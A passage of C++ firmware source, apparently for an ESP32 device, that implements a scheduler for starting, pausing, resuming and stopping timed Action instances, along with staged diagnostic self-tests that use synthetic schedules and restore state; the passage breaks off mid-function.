// Stage 8Y: exercise the complete live poll-to-runner path with a synthetic
// pending instance. The short Action uses the existing harmless runner and is
// allowed to finish naturally; no saved schedule records or Flash data change.
void testLiveSchedulerPollRuntimeIntegration() {
  if (actionActive || actionTaskHandle != nullptr ||
      activeActionInstance.state != ACTION_INSTANCE_EMPTY ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0 ||
      schedulerPauseAllRequested) {
    sendSimpleResponse("SCHED_LIVE_POLL_TEST:BUSY");
    return;
  }

  const uint32_t originalNextInstanceId = nextActionInstanceId;
  ActionInstance testInstance = {};
  testInstance.instanceId = 65000;
  testInstance.scheduleId = 65000; // No matching saved record: no Flash writes.
  testInstance.actionType = SCHEDULE_ACTION_ALL;
  testInstance.state = ACTION_INSTANCE_PENDING;
  testInstance.dueAtUtc = 1;
  testInstance.durationMode = SCHEDULE_ACTIVE_DURATION;
  testInstance.remainingTotalActiveSeconds = 2;
  testInstance.timingPhase = ACTION_TIMING_ACTIVE;
  testInstance.executionDurationSeconds = 0;
  testInstance.remainingExecutionSeconds = 0;
  testInstance.pauseIntervalSeconds = 0;
  testInstance.remainingPauseSeconds = 0;
  testInstance.timingConfigured = true;
  strncpy(testInstance.command, "ACTION_ALL", sizeof(testInstance.command) - 1);

  bool passed = enqueuePendingScheduledAction(testInstance);
  const bool dispatched = passed && runSchedulerPollAtUtc(2);
  passed = passed && dispatched && actionActive && actionTaskHandle != nullptr &&
      activeActionInstance.instanceId == testInstance.instanceId &&
      activeActionInstance.scheduleId == testInstance.scheduleId &&
      activeActionInstance.state == ACTION_INSTANCE_RUNNING &&
      pendingScheduledActionCount == 0;

  if (!passed) {
    txAbortRequested = true;
    clearPendingScheduledActions();
    nextActionInstanceId = originalNextInstanceId;
    Serial.println("[Scheduler] Stage 8Y live poll-to-runner integration test FAILED during dispatch.");
    sendSimpleResponse("SCHED_LIVE_POLL_TEST:FAILED");
    return;
  }

  Serial.println("[Scheduler] Stage 8Y dispatched the queued instance through the live poll path; waiting for its 2-second harmless Action to finish.");
  const uint32_t waitStartedMs = millis();
  while ((actionActive || actionTaskHandle != nullptr ||
          activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
         static_cast<uint32_t>(millis() - waitStartedMs) < 4500UL) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  passed = !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY &&
      pendingScheduledActionCount == 0;

  if (!passed && actionTaskHandle != nullptr) {
    txAbortRequested = true;
    const uint32_t abortWaitStartedMs = millis();
    while ((actionActive || actionTaskHandle != nullptr) &&
           static_cast<uint32_t>(millis() - abortWaitStartedMs) < 1500UL) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
  }

  clearPendingScheduledActions();
  nextActionInstanceId = originalNextInstanceId;
  const bool runnerClean = !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY;
  passed = passed && runnerClean;

  if (passed) {
    Serial.println("[Scheduler] Stage 8Y live poll-to-runner integration test PASSED.");
    sendSimpleResponse("SCHED_LIVE_POLL_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8Y live poll-to-runner integration test FAILED; runner cleanup was checked.");
    sendSimpleResponse("SCHED_LIVE_POLL_TEST:FAILED");
  }
}

// Stage 8Z: parse the public runtime-status response and compare every field
// against the scheduler's live state. This checks the status contract while
// the runner is active and again after its task has completely exited.
bool schedulerRuntimeSnapshotMatches(bool expectRunnerBusy,
                                     uint32_t expectedActiveId,
                                     uint8_t expectedActiveState,
                                     uint8_t expectedInterruptedCount,
                                     uint8_t expectedPendingCount) {
  char response[128] = {0};
  formatSchedulerRuntimeStatus(response, sizeof(response));
  Serial.printf("[Scheduler] Runtime snapshot: %s\n", response);

  char globalState[8] = {0};
  unsigned long activeId = 0;
  unsigned int activeState = 0;
  unsigned int interruptedCount = 0;
  unsigned int pendingCount = 0;
  unsigned int savedCount = 0;
  unsigned int runnerBusy = 0;
  const int fields = sscanf(response,
      "SCHED_RUNTIME_STATUS:%7[^,],%lu,%u,%u,%u,%u,%u",
      globalState, &activeId, &activeState, &interruptedCount,
      &pendingCount, &savedCount, &runnerBusy);

  const char* expectedGlobalState = schedulerPauseAllRequested ? "PAUSED" : "RUNNING";
  return fields == 7 &&
      strcmp(globalState, expectedGlobalState) == 0 &&
      activeId == static_cast<unsigned long>(expectedActiveId) &&
      activeState == static_cast<unsigned int>(expectedActiveState) &&
      interruptedCount == expectedInterruptedCount &&
      pendingCount == expectedPendingCount &&
      savedCount == schedulerData.count &&
      runnerBusy == (expectRunnerBusy ? 1U : 0U) &&
      ((runnerBusy == 0U && activeState == ACTION_INSTANCE_EMPTY && activeId == 0UL) ||
       (runnerBusy == 1U && activeId != 0UL &&
        activeState != ACTION_INSTANCE_EMPTY));
}

// Stage 8Z diagnostic: verify runtime status during a real harmless scheduled
// runner lifecycle. The synthetic instance is not associated with a saved
// schedule, so this test does not write or alter saved schedule records.
void testSchedulerRuntimeLifecycleConsistency() {
  if (actionActive || actionTaskHandle != nullptr ||
      activeActionInstance.state != ACTION_INSTANCE_EMPTY ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0 ||
      schedulerPauseAllRequested) {
    sendSimpleResponse("SCHED_RUNTIME_LIFECYCLE_TEST:BUSY");
    return;
  }

  const uint32_t originalNextInstanceId = nextActionInstanceId;
  const uint32_t testInstanceId = 65001;
  ActionInstance testInstance = {};
  testInstance.instanceId = testInstanceId;
  testInstance.scheduleId = 65001; // No matching saved record: no Flash writes.
  testInstance.actionType = SCHEDULE_ACTION_ALL;
  testInstance.state = ACTION_INSTANCE_PENDING;
  testInstance.dueAtUtc = 1;
  testInstance.durationMode = SCHEDULE_ACTIVE_DURATION;
  testInstance.remainingTotalActiveSeconds = 2;
  testInstance.timingPhase = ACTION_TIMING_ACTIVE;
  testInstance.executionDurationSeconds = 0;
  testInstance.remainingExecutionSeconds = 0;
  testInstance.pauseIntervalSeconds = 0;
  testInstance.remainingPauseSeconds = 0;
  testInstance.timingConfigured = true;
  strncpy(testInstance.command, "ACTION_ALL", sizeof(testInstance.command) - 1);

  bool passed = schedulerRuntimeSnapshotMatches(false, 0,
      ACTION_INSTANCE_EMPTY, 0, 0);
  passed = passed && enqueuePendingScheduledAction(testInstance);
  const bool dispatched = passed && runSchedulerPollAtUtc(2);
  passed = passed && dispatched && actionActive && actionTaskHandle != nullptr &&
      activeActionInstance.instanceId == testInstanceId &&
      activeActionInstance.state == ACTION_INSTANCE_RUNNING &&
      pendingScheduledActionCount == 0;

  if (passed) {
    passed = schedulerRuntimeSnapshotMatches(true, testInstanceId,
        ACTION_INSTANCE_RUNNING, 0, 0);
  }

  if (!passed) {
    txAbortRequested = true;
    clearPendingScheduledActions();
    const uint32_t cleanupStartedMs = millis();
    while ((actionActive || actionTaskHandle != nullptr ||
            activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
           static_cast<uint32_t>(millis() - cleanupStartedMs) < 2000UL) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
    clearPendingScheduledActions();
    nextActionInstanceId = originalNextInstanceId;
    Serial.println("[Scheduler] Stage 8Z runtime lifecycle consistency test FAILED during startup/status validation.");
    sendSimpleResponse("SCHED_RUNTIME_LIFECYCLE_TEST:FAILED");
    return;
  }

  Serial.println("[Scheduler] Stage 8Z runtime status correctly reports the running instance.");
  const uint32_t waitStartedMs = millis();
  while ((actionActive || actionTaskHandle != nullptr ||
          activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
         static_cast<uint32_t>(millis() - waitStartedMs) < 4500UL) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  const bool runnerIdle = !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY;
  passed = passed && runnerIdle && interruptedActionCount == 0 &&
      pendingScheduledActionCount == 0 &&
      schedulerRuntimeSnapshotMatches(false, 0, ACTION_INSTANCE_EMPTY, 0, 0);

  if (!passed && (actionActive || actionTaskHandle != nullptr ||
                  activeActionInstance.state != ACTION_INSTANCE_EMPTY)) {
    txAbortRequested = true;
    const uint32_t cleanupStartedMs = millis();
    while ((actionActive || actionTaskHandle != nullptr ||
            activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
           static_cast<uint32_t>(millis() - cleanupStartedMs) < 2000UL) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
  }

  clearPendingScheduledActions();
  nextActionInstanceId = originalNextInstanceId;
  const bool finalCleanup = !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY &&
      interruptedActionCount == 0 && pendingScheduledActionCount == 0;
  passed = passed && finalCleanup;

  if (passed) {
    Serial.println("[Scheduler] Stage 8Z runtime lifecycle consistency test PASSED.");
    sendSimpleResponse("SCHED_RUNTIME_LIFECYCLE_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8Z runtime lifecycle consistency test FAILED; cleanup was checked.");
    sendSimpleResponse("SCHED_RUNTIME_LIFECYCLE_TEST:FAILED");
  }
}

// Stage 9A: locate the live Action instance belonging to a saved schedule.
// The active runner takes precedence, followed by interrupted and pending items.
bool findScheduleActionInstance(uint16_t scheduleId, ActionInstance& found) {
  if (scheduleId == 0) return false;

  if (activeActionInstance.state != ACTION_INSTANCE_EMPTY &&
      activeActionInstance.scheduleId == scheduleId) {
    found = activeActionInstance;
    return true;
  }

  for (uint8_t i = interruptedActionCount; i > 0; --i) {
    const ActionInstance& instance = interruptedActionStack[i - 1];
    if (instance.scheduleId == scheduleId &&
        instance.state != ACTION_INSTANCE_EMPTY) {
      found = instance;
      return true;
    }
  }

  for (uint8_t i = 0; i < pendingScheduledActionCount; ++i) {
    const ActionInstance& instance = pendingScheduledActions[i];
    if (instance.scheduleId == scheduleId &&
        instance.state != ACTION_INSTANCE_EMPTY) {
      found = instance;
      return true;
    }
  }
  return false;
}

bool scheduleHasRuntimeInstance(uint16_t scheduleId) {
  ActionInstance existing = {};
  return findScheduleActionInstance(scheduleId, existing);
}

// Start a saved schedule immediately as a one-off Action instance. This does
// not change the saved schedule's enabled flag or its future recurrence.
bool startSavedScheduleNow(uint16_t scheduleId, char* result,
                           size_t resultSize) {
  if (result == nullptr || resultSize == 0) return false;
  snprintf(result, resultSize, "SCHED_ERROR:UNKNOWN");

  if (schedulerPauseAllRequested) {
    snprintf(result, resultSize, "SCHED_ERROR:PAUSE_ALL_ACTIVE");
    return false;
  }
  if (!timeSynced) {
    snprintf(result, resultSize, "SCHED_ERROR:TIME_NOT_SET");
    return false;
  }
  if (scheduleId == 0) {
    snprintf(result, resultSize, "SCHED_ERROR:INVALID_ID");
    return false;
  }
  if (scheduleHasRuntimeInstance(scheduleId)) {
    snprintf(result, resultSize, "SCHED_ERROR:INSTANCE_EXISTS");
    return false;
  }

  const ScheduleRecord* selectedSchedule = nullptr;
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    if (schedulerData.records[i].id == scheduleId) {
      selectedSchedule = &schedulerData.records[i];
      break;
    }
  }
  if (selectedSchedule == nullptr) {
    snprintf(result, resultSize, "SCHED_ERROR:NOT_FOUND");
    return false;
  }

  const time_t currentTime = time(nullptr);
  if (currentTime <= 0) {
    snprintf(result, resultSize, "SCHED_ERROR:TIME_NOT_SET");
    return false;
  }
  const uint32_t nowUtc = static_cast<uint32_t>(currentTime);
  uint32_t fixedEndUtc = 0;

  if (selectedSchedule->durationMode == SCHEDULE_FIXED_END_TIME) {
    if (selectedSchedule->scheduleType == SCHEDULE_ONE_TIME) {
      fixedEndUtc = selectedSchedule->fixedEndAtUtc;
      if (fixedEndUtc == 0 || nowUtc >= fixedEndUtc) {
        snprintf(result, resultSize, "SCHED_ERROR:FIXED_END_EXPIRED");
        return false;
      }
    } else if (!resolveRecurringFixedEndUtc(*selectedSchedule, nowUtc,
                                             fixedEndUtc)) {
      snprintf(result, resultSize, "SCHED_ERROR:INVALID_FIXED_END");
      return false;
    }
  }

  ActionInstance instance = {};
  if (!initializeScheduledActionInstance(*selectedSchedule, nowUtc,
                                         fixedEndUtc, instance)) {
    snprintf(result, resultSize, "SCHED_ERROR:INVALID_SCHEDULE");
    return false;
  }

  if (!enqueuePendingScheduledAction(instance)) {
    snprintf(result, resultSize, "SCHED_ERROR:QUEUE_FULL");
    return false;
  }

  // The normal dispatcher preserves interruption-stack behavior if another
  // Action is already running. A queued result is still a successful start
  // request when the current runner must finish its cooperative handoff first.
  dispatchNextPendingScheduledAction(nowUtc);
  snprintf(result, resultSize, "SCHED_START:%u:QUEUED",
           static_cast<unsigned int>(scheduleId));
  Serial.printf("[Scheduler] Manual start requested for schedule %u; instance %lu queued for immediate dispatch.\n",
                static_cast<unsigned int>(scheduleId),
                static_cast<unsigned long>(instance.instanceId));
  return true;
}

// Stage 9B: control one saved schedule's live Action instance without
// changing the saved schedule configuration or its future occurrences.
bool controlScheduleActionInstance(uint16_t scheduleId, bool resume,
                                   char* result, size_t resultSize) {
  if (result == nullptr || resultSize == 0) return false;
  snprintf(result, resultSize, "SCHED_ERROR:INSTANCE_NOT_FOUND");
  if (scheduleId == 0) {
    snprintf(result, resultSize, "SCHED_ERROR:INVALID_ID");
    return false;
  }
  if (resume && schedulerPauseAllRequested) {
    snprintf(result, resultSize, "SCHED_ERROR:PAUSE_ALL_ACTIVE");
    return false;
  }

  if (activeActionInstance.state != ACTION_INSTANCE_EMPTY &&
      activeActionInstance.scheduleId == scheduleId) {
    if (!actionActive || actionTaskHandle == nullptr) {
      snprintf(result, resultSize, "SCHED_ERROR:RUNNER_NOT_READY");
      return false;
    }
    if (resume) {
      if (!actionPauseRequested &&
          activeActionInstance.state == ACTION_INSTANCE_RUNNING) {
        snprintf(result, resultSize, "SCHED_RESUME:%u:ALREADY_RUNNING", scheduleId);
        return true;
      }
      actionPauseRequested = false;
      if (activeActionInstance.state == ACTION_INSTANCE_PAUSE_REQUESTED ||
          activeActionInstance.state == ACTION_INSTANCE_PAUSED) {
        activeActionInstance.state = ACTION_INSTANCE_RUNNING;
      }
      snprintf(result, resultSize, "SCHED_RESUME:%u:REQUESTED", scheduleId);
      Serial.printf("[Scheduler] Resume requested for schedule %u (instance %lu).\n",
                    scheduleId, static_cast<unsigned long>(activeActionInstance.instanceId));
      return true;
    }

    if (actionPauseRequested ||
        activeActionInstance.state == ACTION_INSTANCE_PAUSED ||
        activeActionInstance.state == ACTION_INSTANCE_PAUSE_REQUESTED) {
      snprintf(result, resultSize, "SCHED_PAUSE:%u:ALREADY_PAUSED", scheduleId);
      return true;
    }
    actionPauseRequested = true;
    activeActionInstance.state = ACTION_INSTANCE_PAUSE_REQUESTED;
    snprintf(result, resultSize, "SCHED_PAUSE:%u:REQUESTED", scheduleId);
    Serial.printf("[Scheduler] Pause requested for schedule %u (instance %lu).\n",
                  scheduleId, static_cast<unsigned long>(activeActionInstance.instanceId));
    return true;
  }

  for (uint8_t i = interruptedActionCount; i > 0; --i) {
    const ActionInstance& stacked = interruptedActionStack[i - 1];
    if (stacked.scheduleId != scheduleId) continue;
    if (!resume) {
      snprintf(result, resultSize, "SCHED_PAUSE:%u:ALREADY_PAUSED", scheduleId);
      return true;
    }
    // Interruption order is strictly LIFO. A stacked Action cannot jump ahead
    // of a newer Action that is still running or of another stack entry.
    if (i != interruptedActionCount || actionActive || actionTaskHandle != nullptr) {
      snprintf(result, resultSize, "SCHED_ERROR:INTERRUPTED_BY_NEWER_ACTION");
      return false;
    }
    ActionInstance instance = {};
    if (!popInterruptedAction(instance)) {
      snprintf(result, resultSize, "SCHED_ERROR:RESUME_FAILED");
      return false;
    }
    const uint32_t nowUtc = timeSynced
        ? static_cast<uint32_t>(time(nullptr)) : 0;
    if (instance.durationMode == SCHEDULE_FIXED_END_TIME &&
        (nowUtc == 0 || instance.fixedEndAtUtc == 0 ||
         nowUtc >= instance.fixedEndAtUtc)) {
      snprintf(result, resultSize, "SCHED_ERROR:FIXED_END_EXPIRED");
      return false;
    }
    instance.state = ACTION_INSTANCE_PENDING;
    if (!startResumedActionTask(instance)) {
      instance.state = ACTION_INSTANCE_PAUSED;
      pushInterruptedAction(instance);
      snprintf(result, resultSize, "SCHED_ERROR:RESUME_FAILED");
      return false;
    }
    snprintf(result, resultSize, "SCHED_RESUME:%u:STARTED", scheduleId);
    return true;
  }

  for (uint8_t i = 0; i < pendingScheduledActionCount; ++i) {
    if (pendingScheduledActions[i].scheduleId != scheduleId) continue;
    snprintf(result, resultSize, resume
        ? "SCHED_RESUME:%u:ALREADY_PENDING"
        : "SCHED_ERROR:INSTANCE_PENDING", scheduleId);
    return resume;
  }
  return false;
}

// Stop only a manually started Action (scheduleId == 0). If a scheduled
// Action is currently running and the manual Action is paused on the
// interruption stack, remove only that manual instance and leave the
// scheduled foreground runner untouched.
bool stopManualActionInstance(int actionTypeFilter, char* result,
                              size_t resultSize) {
  if (result == nullptr || resultSize == 0) return false;
  snprintf(result, resultSize, "MANUAL_STOP:NOT_FOUND");

  if (activeActionInstance.state != ACTION_INSTANCE_EMPTY &&
      activeActionInstance.scheduleId == 0 &&
      (actionTypeFilter < 0 ||
       activeActionInstance.actionType == static_cast<uint8_t>(actionTypeFilter))) {
    if (!actionActive || actionTaskHandle == nullptr) {
      snprintf(result, resultSize, "MANUAL_STOP:RUNNER_NOT_READY");
      return false;
    }
    actionPauseRequested = false;
    actionYieldRequested = false;
    txAbortRequested = true;
    snprintf(result, resultSize, "MANUAL_STOP:REQUESTED");
    Serial.printf("[Action] Manual-only Stop requested for active instance %lu.\n",
                  static_cast<unsigned long>(activeActionInstance.instanceId));
    return true;
  }

  for (uint8_t i = 0; i < interruptedActionCount; ++i) {
    const ActionInstance& stacked = interruptedActionStack[i];
    if (stacked.scheduleId != 0 ||
        (actionTypeFilter >= 0 &&
         stacked.actionType != static_cast<uint8_t>(actionTypeFilter))) {
      continue;
    }
    const uint32_t stoppedInstanceId = stacked.instanceId;
    const bool wasAllAction = stacked.actionType == SCHEDULE_ACTION_ALL;
    if (!removeInterruptedActionById(stoppedInstanceId)) break;
    snprintf(result, resultSize, "MANUAL_STOP:STOPPED");
    Serial.printf("[Action] Removed paused manual instance %lu without stopping the scheduled foreground Action.\n",
                  static_cast<unsigned long>(stoppedInstanceId));
    sendBLEMessage(wasAllAction
        ? "{\"event\":\"TX_ALL_ABORTED\"}"
        : "{\"event\":\"TX_ABORTED\"}");
    return true;
  }

  return false;
}

// Stage 9C: stop only the live instance for one schedule. A manually stopped
// one-time schedule is disabled in Flash; recurring schedules remain enabled
// for their next occurrence. Active runners are cooperatively aborted, while
// stacked and pending instances are removed without disturbing other entries.
bool stopScheduleActionInstance(uint16_t scheduleId, char* result,
                                size_t resultSize) {
  if (result == nullptr || resultSize == 0) return false;
  snprintf(result, resultSize, "SCHED_ERROR:INSTANCE_NOT_FOUND");
  if (scheduleId == 0) {
    snprintf(result, resultSize, "SCHED_ERROR:INVALID_ID");
    return false;
  }

  ActionInstance matchingInstance = {};
  if (!findScheduleActionInstance(scheduleId, matchingInstance)) return false;

  const bool isActiveInstance =
      activeActionInstance.state != ACTION_INSTANCE_EMPTY &&
      activeActionInstance.scheduleId == scheduleId;
  if (isActiveInstance && (!actionActive || actionTaskHandle == nullptr)) {
    snprintf(result, resultSize, "SCHED_ERROR:RUNNER_NOT_READY");
    return false;
  }

  int scheduleIndex = -1;
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    if (schedulerData.records[i].id == scheduleId) {
      scheduleIndex = static_cast<int>(i);
      break;
    }
  }
  if (scheduleIndex < 0) {
    snprintf(result, resultSize, "SCHED_ERROR:SCHEDULE_NOT_FOUND");
    return false;
  }

  // SCHED_START can launch a one-time schedule without changing its enabled
  // flag. Explicit Stop must disable that path as well as auto-dispatched ones.
  // Save first: a Flash failure must not stop the runtime instance while
  // leaving its one-time schedule eligible to run again.
  ScheduleRecord& savedSchedule = schedulerData.records[scheduleIndex];
  if (savedSchedule.scheduleType == SCHEDULE_ONE_TIME && savedSchedule.enabled) {
    savedSchedule.enabled = false;
    if (!saveSchedulerStorage()) {
      savedSchedule.enabled = true;
      snprintf(result, resultSize, "SCHED_ERROR:SAVE_FAILED");
      Serial.printf("[Scheduler] Could not persist one-time Stop for schedule %u.\n",
                    static_cast<unsigned int>(scheduleId));
      return false;
    }
  }

  if (isActiveInstance) {
    actionPauseRequested = false;
    actionYieldRequested = false;
    txAbortRequested = true;
    snprintf(result, resultSize, "SCHED_STOP:%u:REQUESTED", scheduleId);
    Serial.printf("[Scheduler] Stop requested for active schedule %u (instance %lu).\n",
                  static_cast<unsigned int>(scheduleId),
                  static_cast<unsigned long>(activeActionInstance.instanceId));
    return true;
  }

  const bool removedFromStack = removeInterruptedActionByScheduleId(scheduleId);
  const bool removedFromPending = removePendingScheduledActionByScheduleId(scheduleId);
  if (removedFromStack || removedFromPending) {
    snprintf(result, resultSize, "SCHED_STOP:%u:STOPPED", scheduleId);
    Serial.printf("[Scheduler] Stopped paused/pending instance for schedule %u.\n",
                  static_cast<unsigned int>(scheduleId));
    return true;
  }
  return false;
}

void sendScheduleActionInstanceStatus(const char* command) {
  uint32_t parsedId = 0;
  if (!parseUnsignedValue(command + 22, parsedId) || parsedId == 0 ||
      parsedId > 65535) {
    sendSimpleResponse("SCHED_ERROR:INVALID_ID");
    return;
  }

  ActionInstance instance = {};
  if (!findScheduleActionInstance(static_cast<uint16_t>(parsedId), instance)) {
    char response[64];
    snprintf(response, sizeof(response), "SCHED_INSTANCE_STATUS:%lu,NONE,0",
             static_cast<unsigned long>(parsedId));
    sendSimpleResponse(response);
    return;
  }

  const char* stateName = "UNKNOWN";
  switch (instance.state) {
    case ACTION_INSTANCE_RUNNING: stateName = "RUNNING"; break;
    case ACTION_INSTANCE_PAUSED: stateName = "PAUSED"; break;
    case ACTION_INSTANCE_PENDING: stateName = "PENDING"; break;
    case ACTION_INSTANCE_PAUSE_REQUESTED: stateName = "PAUSE_REQUESTED"; break;
    default: break;
  }

  char response[96];
  snprintf(response, sizeof(response), "SCHED_INSTANCE_STATUS:%u,%s,%lu",
           static_cast<unsigned int>(parsedId), stateName,
           static_cast<unsigned long>(instance.instanceId));
  sendSimpleResponse(response);
}

// Stage 9A diagnostic: exercise manual per-schedule Start and status reporting
// with a temporary RAM-only schedule. No saved schedule or Wi-Fi data is written.
void testPerScheduleManualStart() {
  if (!timeSynced || actionActive || actionTaskHandle != nullptr ||
      activeActionInstance.state != ACTION_INSTANCE_EMPTY ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0 ||
      schedulerPauseAllRequested || schedulerData.count >= MAX_SCHEDULES) {
    sendSimpleResponse("SCHED_MANUAL_START_TEST:BUSY_OR_TIME_NOT_SET");
    return;
  }

  const SchedulerStorage originalSchedulerData = schedulerData;
  const uint32_t originalNextInstanceId = nextActionInstanceId;
  const uint16_t testScheduleId = 65002;
  ScheduleRecord testSchedule = {};
  testSchedule.id = testScheduleId;
  testSchedule.scheduleType = SCHEDULE_RECURRING;
  testSchedule.actionType = SCHEDULE_ACTION_ALL;
  testSchedule.durationMode = SCHEDULE_ACTIVE_DURATION;
  testSchedule.totalDurationSeconds = 2;
  testSchedule.executionDurationSeconds = 0;
  testSchedule.pauseIntervalSeconds = 0;
  testSchedule.enabled = false; // Manual Start is independent of auto-enable.
  // Temporarily isolate the diagnostic from real saved schedules while it runs.
  memset(&schedulerData, 0, sizeof(schedulerData));
  schedulerData.version = SCHEDULER_STORAGE_VERSION;
  schedulerData.count = 1;
  schedulerData.records[0] = testSchedule;

  char startResponse[64] = {0};
  bool passed = startSavedScheduleNow(testScheduleId, startResponse,
                                      sizeof(startResponse));
  passed = passed && strstr(startResponse, "SCHED_START:65002:QUEUED") != nullptr;

  ActionInstance running = {};
  const uint32_t waitStartedMs = millis();
  while (static_cast<uint32_t>(millis() - waitStartedMs) < 500UL &&
         !findScheduleActionInstance(testScheduleId, running)) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && running.instanceId != 0 &&
      (running.state == ACTION_INSTANCE_RUNNING ||
       running.state == ACTION_INSTANCE_PAUSE_REQUESTED);

  char statusResponse[96] = {0};
  if (passed) {
    // Confirm the same public status command used by the Android app.
    ActionInstance statusInstance = {};
    passed = findScheduleActionInstance(testScheduleId, statusInstance) &&
        statusInstance.instanceId == running.instanceId;
    if (passed) {
      const char* stateName = statusInstance.state == ACTION_INSTANCE_RUNNING
          ? "RUNNING" : "PAUSE_REQUESTED";
      snprintf(statusResponse, sizeof(statusResponse),
               "SCHED_INSTANCE_STATUS:%u,%s,%lu",
               static_cast<unsigned int>(testScheduleId), stateName,
               static_cast<unsigned long>(statusInstance.instanceId));
      Serial.printf("[Scheduler] Manual-start status: %s\n", statusResponse);
    }
  }

  const uint32_t finishWaitStartedMs = millis();
  while ((actionActive || actionTaskHandle != nullptr ||
          activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
         static_cast<uint32_t>(millis() - finishWaitStartedMs) < 5000UL) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  bool runnerClean = !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY &&
      interruptedActionCount == 0 && pendingScheduledActionCount == 0;
  if (!runnerClean && actionActive && actionTaskHandle != nullptr) {
    txAbortRequested = true;
    actionPauseRequested = false;
    actionYieldRequested = false;
    const uint32_t abortWaitStartedMs = millis();
    while ((actionActive || actionTaskHandle != nullptr ||
            activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
           static_cast<uint32_t>(millis() - abortWaitStartedMs) < 1500UL) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
    runnerClean = !actionActive && actionTaskHandle == nullptr &&
        activeActionInstance.state == ACTION_INSTANCE_EMPTY;
  }
  clearPendingScheduledActions();
  passed = passed && runnerClean && interruptedActionCount == 0;

  // Restore the complete saved schedule RAM snapshot and instance counter.
  schedulerData = originalSchedulerData;
  nextActionInstanceId = originalNextInstanceId;

  if (passed) {
    Serial.println("[Scheduler] Stage 9A per-schedule manual Start test PASSED.");
    sendSimpleResponse("SCHED_MANUAL_START_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 9A per-schedule manual Start test FAILED.");
    sendSimpleResponse("SCHED_MANUAL_START_TEST:FAILED");
  }
}

// Stage 9B diagnostic: pause and resume one live schedule instance, then
// verify that it completes and leaves no stale runtime state.
void testPerSchedulePauseResume() {
  if (!timeSynced || actionActive || actionTaskHandle != nullptr ||
      activeActionInstance.state != ACTION_INSTANCE_EMPTY ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0 ||
      schedulerPauseAllRequested || schedulerData.count >= MAX_SCHEDULES) {
    sendSimpleResponse("SCHED_PAUSE_RESUME_TEST:BUSY_OR_TIME_NOT_SET");
    return;
  }

  const SchedulerStorage originalSchedulerData = schedulerData;
  const uint32_t originalNextInstanceId = nextActionInstanceId;
  const uint16_t testScheduleId = 65003;
  ScheduleRecord testSchedule = {};
  testSchedule.id = testScheduleId;
  testSchedule.scheduleType = SCHEDULE_RECURRING;
  testSchedule.actionType = SCHEDULE_ACTION_ALL;
  testSchedule.durationMode = SCHEDULE_ACTIVE_DURATION;
  testSchedule.totalDurationSeconds = 2;
  testSchedule.executionDurationSeconds = 0;
  testSchedule.pauseIntervalSeconds = 0;
  testSchedule.enabled = false;
  memset(&schedulerData, 0, sizeof(schedulerData));
  schedulerData.version = SCHEDULER_STORAGE_VERSION;
  schedulerData.count = 1;
  schedulerData.records[0] = testSchedule;

  char response[80] = {0};
  bool passed = startSavedScheduleNow(testScheduleId, response, sizeof(response)) &&
      strstr(response, "SCHED_START:65003:QUEUED") != nullptr;

  ActionInstance instance = {};
  const uint32_t startWaitMs = millis();
  while (passed && static_cast<uint32_t>(millis() - startWaitMs) < 500UL &&
         (!findScheduleActionInstance(testScheduleId, instance) ||
          instance.state != ACTION_INSTANCE_RUNNING)) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && findScheduleActionInstance(testScheduleId, instance) &&
      instance.state == ACTION_INSTANCE_RUNNING;

  if (passed) {
    passed = controlScheduleActionInstance(testScheduleId, false,
                                           response, sizeof(response)) &&
        strstr(response, "SCHED_PAUSE:65003:REQUESTED") != nullptr;
  }
  const uint32_t pauseWaitMs = millis();
  while (passed && static_cast<uint32_t>(millis() - pauseWaitMs) < 500UL &&
         activeActionInstance.state != ACTION_INSTANCE_PAUSED) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && activeActionInstance.scheduleId == testScheduleId &&
      activeActionInstance.state == ACTION_INSTANCE_PAUSED && actionActive;

  if (passed) {
    passed = controlScheduleActionInstance(testScheduleId, true,
                                           response, sizeof(response)) &&
        strstr(response, "SCHED_RESUME:65003:REQUESTED") != nullptr;
  }
  passed = passed && activeActionInstance.state == ACTION_INSTANCE_RUNNING &&
      !actionPauseRequested;

  const uint32_t finishWaitMs = millis();
  while ((actionActive || actionTaskHandle != nullptr ||
          activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
         static_cast<uint32_t>(millis() - finishWaitMs) < 5000UL) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  const bool runnerClean = !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY &&
      interruptedActionCount == 0 && pendingScheduledActionCount == 0;
  passed = passed && runnerClean;

  if (!runnerClean && actionActive && actionTaskHandle != nullptr) {
    txAbortRequested = true;
    actionPauseRequested = false;
    actionYieldRequested = false;
    const uint32_t cleanupMs = millis();
    while ((actionActive || actionTaskHandle != nullptr) &&
           static_cast<uint32_t>(millis() - cleanupMs) < 1500UL) {
